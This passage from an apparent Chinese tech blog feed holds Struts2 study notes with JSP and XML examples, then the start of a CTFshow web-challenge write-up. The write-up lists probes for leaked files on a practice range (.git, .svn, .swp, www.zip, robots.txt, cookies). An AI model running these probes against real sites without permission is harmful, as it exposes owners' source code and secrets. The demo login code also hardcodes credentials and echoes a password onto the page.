class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>$&#123;success &#125;<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>用户登录信息<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>用户名:$&#123;username &#125;<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>密    码:$&#123;password &#125;<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>error.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot;<br>    pageEncoding=&quot;UTF-8&quot;%&gt;<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span> <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="hljs-meta-string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>登陆失败页面<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>$&#123;error &#125;<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>发布项目访问login.jsp<br><img src="https://img-blog.csdnimg.cn/20210326201914583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入错误的账号密码，提示登陆失败<br><img src="https://img-blog.csdnimg.cn/20210326201922847.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入正确的用户名admin和密码123456，提示登陆成功<br><img src="https://img-blog.csdnimg.cn/20210326201939672.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>从返回用户信息，可以看出来，在Action中放入ActionContext的key-value键值对被提取出来了，说明struts2可以通过ActionContext类访问Servlet API。</p><h3 id="通过特定接口访问"><a href="#通过特定接口访问" class="headerlink" title="通过特定接口访问"></a>通过特定接口访问</h3><p>Struts2框架提供了ActionContext来访问Servlet API，但无法直接获得Servlet API实例，Struts2提供如下几个接口使Action可以直接访问到Servlet API：</p><table><thead><tr><th>接口</th><th>功能描述</th></tr></thead><tbody><tr><td>ServletContextAware</td><td>实现该接口的Action可以直接访问Web应用的ServletContext实例</td></tr><tr><td>ServletRequestAware</td><td>实现该接口的Action可以直接访问Web应用的ServletRequest实例</td></tr><tr><td>ServletResponseAware:</td><td>实现该接口的Action可以直接访问Web应用的ServletRsponse实例</td></tr></tbody></table><p>实例2：</p><p>AwareAction.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.action;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><br><span class="hljs-keyword">import</span> org.apache.struts2.interceptor.ServletRequestAware;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionContext;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionSupport;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AwareAction</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ActionSupport</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ServletRequestAware</span></span>&#123;<br>HttpServletRequest request;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setServletRequest</span><span class="hljs-params">(HttpServletRequest request)</span> </span>&#123;<br><span class="hljs-keyword">this</span>.request=request;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">execute</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>request.setAttribute(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;通过ServletRequestAware接口实现了访问Servlet API的访问&quot;</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>struts.xml配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;AwareDemo&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;aware&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.AwareAction&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span>&gt;</span>/message.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><p>message.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">algin</span>=<span class="hljs-string">&quot;center&quot;</span>&gt;</span>$&#123;requestScope.message&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure><p>发布项目，访问aware<br><img src="https://img-blog.csdnimg.cn/20210326204201290.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看出，使用ServletRequestAware接口顺利访问Servlet API了的</p><h3 id="通过ServletActionContext访问"><a href="#通过ServletActionContext访问" class="headerlink" title="通过ServletActionContext访问"></a>通过ServletActionContext访问</h3><p>Struts2还提供了一个ServletActionContext工具类用来访问Servlet API。该类包含了一下几个静态方法：</p><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>static PageContext getPageContext()</td><td>取得Web应用的PageContext对象</td></tr><tr><td>static HttpServletRequest getRequest()</td><td>取得Web应用的?HttpServletRequest对象</td></tr><tr><td>static HttpServletResponse getResponse()</td><td>取得Web应用的HttpServletResponse对象</td></tr><tr><td>static ServletContext getServletContext()</td><td>取得Web应用的ServletContext对象</td></tr></tbody></table><p>实例3：<br>ContextAction.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.action;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><br><span class="hljs-keyword">import</span> org.apache.struts2.ServletActionContext;<br><span class="hljs-keyword">import</span> org.apache.struts2.interceptor.ServletRequestAware;<br><br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionContext;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionSupport;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ContextAction</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ActionSupport</span> </span>&#123;<br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">execute</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>ServletActionContext.getRequest().setAttribute(<span class="hljs-string">&quot;message&quot;</span>, <br><span class="hljs-string">&quot;通过ServletActionContext类直接访问Servlet API&quot;</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br><br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>struts.xml配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ContextDemo&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;context&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.ContextAction&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span>&gt;</span>/context.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><p>context.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">algin</span>=<span class="hljs-string">center</span>&gt;</span>$&#123;requestScope.message&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure><p>发布项目，访问context<br><img src="https://img-blog.csdnimg.cn/20210326204934276.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>借助ServletActionContext类的帮助，也可以在Action中直接访问Servlet API，避免了Action实现AxxAction等接口。</p><p>在开发中应优先使用ActionContext来避免和Servlet API耦合</p><h2 id="Aciton处理请求参数"><a href="#Aciton处理请求参数" class="headerlink" title="Aciton处理请求参数"></a>Aciton处理请求参数</h2><p>在Struts2中，页面的请求数据和Action有两种基本的对应方式，分别是字段驱动(FileldDriven)方式和模型驱动(ModelDriven)方式。其中，字段驱动也叫做为属性驱动。</p><h3 id="属性驱动"><a href="#属性驱动" class="headerlink" title="属性驱动"></a>属性驱动</h3><p>  1.基本数据类型字段驱动方式的数据传递:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.hjc.Action;<br><br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionSupport;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ActionOne</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ActionSupport</span> </span>&#123;<br><span class="hljs-keyword">private</span> String UserName;<br><span class="hljs-keyword">private</span> String PassWord;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getUserName</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> UserName;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setUserName</span><span class="hljs-params">(String userName)</span> </span>&#123;<br>UserName = userName;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getPassWord</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> PassWord;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setPassWord</span><span class="hljs-params">(String passWord)</span> </span>&#123;<br>PassWord = passWord;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">execute</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>  2.直接使用域对象字段驱动方式的数据传递</p><h3 id="模型驱动"><a href="#模型驱动" class="headerlink" title="模型驱动"></a>模型驱动</h3><p>模型驱动，通过实现ModelDriven接口来接受请求参数，Action类必须实现接口，并且要重写getModel()方法，这个方法返回的就是Action所使用的数据模型对象。</p><h2 id="Result结果类型"><a href="#Result结果类型" class="headerlink" title="Result结果类型"></a>Result结果类型</h2><h3 id="配置-Result"><a href="#配置-Result" class="headerlink" title="配置 Result"></a>配置 Result</h3><p>result标签的属性：</p><ul><li>name属性：指定逻辑视图的名称，默认为success。</li><li>type 属性：指定返回的视图资源的类型，不同的类型代表不同的结果输出，默认值是dispatcher。</li></ul><p>struts.xml文件中<code>&lt;result&gt;</code>元素配置代码如下所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;loginAction&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.LoginAction&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;redirect&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;loaction&quot;</span>&gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br></code></pre></td></tr></table></figure><p>上述配置，使用了<code>&lt;result&gt;</code>元素的name、type属性和param子元素。</p><p><code>&lt;param&gt;</code>子元素的name属性有两个值,分别如下:</p><table><thead><tr><th>属性</th><th>描述</th></tr></thead><tbody><tr><td>location</td><td>指定该逻辑视图所对应的实际视图资源。</td></tr><tr><td>parse</td><td>指定在逻辑视图资源名称中是否可以使用OGNL表达式。默认值为true,表示可以使用，如果设为false,则表示不支持。</td></tr></tbody></table><p>上面的配置可以简化为：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;loginAction&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.LoginAction&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">result</span>&gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="预定义的结果类型"><a href="#预定义的结果类型" class="headerlink" title="预定义的结果类型"></a>预定义的结果类型</h3><table><thead><tr><th>属性</th><th>说明</th><th>对应类</th></tr></thead><tbody><tr><td>chain</td><td>用来处理Action 链</td><td>com.opensymphony.xwork2.ActionChainResult</td></tr><tr><td>dispatcher</td><td>用来转向页面，通常处理 JSP</td><td>org.apache.struts2.dispatcher.ServletDispatcherResult</td></tr><tr><td>redirect</td><td>重定向到一个URL</td><td>org.apache.struts2.dispatcher.ServletRedirectResult</td></tr><tr><td>redirectAction</td><td>重定向到一个 Action</td><td>org.apache.struts2.dispatcher.ServletActionRedirectResult</td></tr><tr><td>plainText</td><td>显示源文件内容，如文件源码</td><td>org.apache.struts2.dispatcher.PlainTextResult</td></tr><tr><td>freemarker</td><td>处理 FreeMarker 模板</td><td>org.apache.struts2.views.freemarker.FreemarkerResult</td></tr><tr><td>httpheader</td><td>控制特殊 http 行为的结果类型</td><td>org.apache.struts2.dispatcher.HttpHeaderResult</td></tr><tr><td>stream</td><td>向浏览器发送 InputSream 对象，通常用来处理文件下载，还可用于返回 AJAX 数据。</td><td>org.apache.struts2.dispatcher.StreamResult</td></tr><tr><td>velocity</td><td>处理 Velocity 模板</td><td>org.apache.struts2.dispatcher.VelocityResult</td></tr><tr><td>xslt</td><td>处理 XML/XLST 模板</td><td>org.apache.struts2.views.xslt.XSLTResult</td></tr></tbody></table><p>表中例举了Struts2中预定义的全部11种结果类型，其中dispatcher是默认的结果类型，主要用来与JSP整合。其中，dispatcher和redirect是比较常用到的结果集。</p><h3 id="dispatcher结果类型"><a href="#dispatcher结果类型" class="headerlink" title="dispatcher结果类型"></a>dispatcher结果类型</h3><p>dispatcher结果类型用来表示“转发”到指定结果资源，它是struts2默认的结果类型。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span>  <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;dispatcher&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;location&quot;</span> &gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;parse&quot;</span> &gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br></code></pre></td></tr></table></figure><p>上面的代码中，location参数用于指定Action执行完毕后要转向的目标资源；parse参数是一个布尔型的值，默认是true，表示解析location参数中的OGNL表达式。</p><h3 id="redirect结果类型"><a href="#redirect结果类型" class="headerlink" title="redirect结果类型"></a>redirect结果类型</h3><p>redirect结果类型用来重定向到新的结果资源，该资源可以是JSP文件，也可以是Action文件。</p><p>对本文上面<code>通过ActionContext类访问Servlet API</code>标题下面的struts.xml代码进行更改：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;login&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.LoginAction&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;redirect&quot;</span>&gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;error&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;dispatcher&quot;</span>&gt;</span>/error.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br></code></pre></td></tr></table></figure><p>用户名和密码正确，使用redirect重新定向到success.jsp；用户名和密码错误，使用的是dispatcher的结果类型，跳转到error.jsp。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：Struts2框架学习笔记（二）&lt;/p&gt;</summary>
    
    
    
    <category term="编程开发" scheme="http://atkx.top/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"/>
    
    <category term="JAVA" scheme="http://atkx.top/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/JAVA/"/>
    
    
    <category term="Struts2" scheme="http://atkx.top/tags/Struts2/"/>
    
  </entry>
  
  <entry>
    <title>CTFshow-Web入门-信息泄露</title>
    <link href="http://atkx.top/2021/03/26/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    <id>http://atkx.top/2021/03/26/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</id>
    <published>2021-03-26T14:28:01.000Z</published>
    <updated>2021-04-04T14:02:37.271Z</updated>
    
    <content type="html"><![CDATA[<p>CTFshow靶场 Web入门系列</p> <a id="more"></a><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h2><h3 id="考点-源码泄露"><a href="#考点-源码泄露" class="headerlink" title="考点: 源码泄露"></a>考点: 源码泄露</h3><blockquote><p>题目描述：开发注释未及时删除</p></blockquote><p>查看源代码，得到flag</p><h2 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h2><h3 id="考点-前台JS绕过"><a href="#考点-前台JS绕过" class="headerlink" title="考点: 前台JS绕过"></a>考点: 前台JS绕过</h3><blockquote><p>题目描述:js前台拦截 === 无效操作</p></blockquote><p>查看源码方法很多<br>1.禁用JS,再查看源代码；<br>2.在网址前加上<code>view-source:</code>即可查看源代码<br>3.ctrl+u查看源代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br><span class="hljs-built_in">window</span>.oncontextmenu = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>&#125;;  <br><span class="hljs-comment">//禁用鼠标右键</span><br><span class="hljs-built_in">window</span>.onselectstart = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>&#125;;<br><span class="hljs-comment">//禁用页面选择</span><br><span class="hljs-built_in">window</span>.onkeydown = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-keyword">if</span> (event.keyCode==<span class="hljs-number">123</span>)&#123;event.keyCode=<span class="hljs-number">0</span>;event.returnValue=<span class="hljs-literal">false</span>;&#125;&#125;;<br>&lt;/script&gt;<br>   <span class="hljs-comment">//禁用F12键</span><br></code></pre></td></tr></table></figure><h2 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h2><h3 id="考点-协议头信息泄露"><a href="#考点-协议头信息泄露" class="headerlink" title="考点: 协议头信息泄露"></a>考点: 协议头信息泄露</h3><blockquote><p>题目描述：没思路的时候抓个包看看，可能会有意外收获</p></blockquote><p>抓包，查看响应头，即可得到flag</p><h2 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h2><h3 id="考点-robots后台泄露"><a href="#考点-robots后台泄露" class="headerlink" title="考点: robots后台泄露"></a>考点: robots后台泄露</h3><blockquote><p>题目描述：总有人把后台地址写入robots，帮黑阔大佬们引路。</p></blockquote><p>访问robots.txt，得到flagishere.txt信息，访问即可</p><h2 id="Web5"><a href="#Web5" class="headerlink" title="Web5"></a>Web5</h2><h3 id="考点-phps源码泄露"><a href="#考点-phps源码泄露" class="headerlink" title="考点: phps源码泄露"></a>考点: phps源码泄露</h3><blockquote><p>题目描述：phps源码泄露有时候能帮上忙</p></blockquote><p>访问index.phps下载备份文件</p><h2 id="Web6"><a href="#Web6" class="headerlink" title="Web6"></a>Web6</h2><h3 id="考点-源码压缩包泄露"><a href="#考点-源码压缩包泄露" class="headerlink" title="考点: 源码压缩包泄露"></a>考点: 源码压缩包泄露</h3><blockquote><p>题目描述：解压源码到当前目录，测试正常，收工</p></blockquote><p>访问<a href="http://www.zip下载源码,解压得到fl000g.txt,里面的是假flag,需要访问才会得到真flag/">www.zip下载源码，解压得到fl000g.txt，里面的是假flag，需要访问才会得到真flag</a></p><h2 id="Web7"><a href="#Web7" class="headerlink" title="Web7"></a>Web7</h2><h3 id="考点-Git泄露"><a href="#考点-Git泄露" class="headerlink" title="考点: Git泄露"></a>考点: Git泄露</h3><blockquote><p>题目描述：版本控制很重要，但不要部署到生产环境更重要。</p></blockquote><p>访问目录url/.git/</p><h2 id="Web8"><a href="#Web8" class="headerlink" title="Web8"></a>Web8</h2><h3 id="考点-SVN泄露"><a href="#考点-SVN泄露" class="headerlink" title="考点: SVN泄露"></a>考点: SVN泄露</h3><blockquote><p>题目描述：版本控制很重要，但不要部署到生产环境更重要。</p></blockquote><p>访问url/.svn即可</p><h2 id="Web9"><a href="#Web9" class="headerlink" title="Web9"></a>Web9</h2><h3 id="考点-vim临时文件泄露"><a href="#考点-vim临时文件泄露" class="headerlink" title="考点: vim临时文件泄露"></a>考点: vim临时文件泄露</h3><blockquote><p>题目描述：发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了</p></blockquote><p>提示在使用vim时意外退出，会在目录下生成一个备份文件，格式为 .文件名.swp，访问url/index.php.swp下载备份文件</p><h2 id="Web10"><a href="#Web10" class="headerlink" title="Web10"></a>Web10</h2><h3 id="考点-cookie泄露"><a href="#考点-cookie泄露" class="headerlink" title="考点: cookie泄露"></a>考点: cookie泄露</h3><blockquote><p>题目描述：cookie 只是一块饼干，不能存放任何隐私数据</p></blockquote><p>抓包查看cookie发现flag</p><h2 id="Web11"><a href="#Web11" class="headerlink" 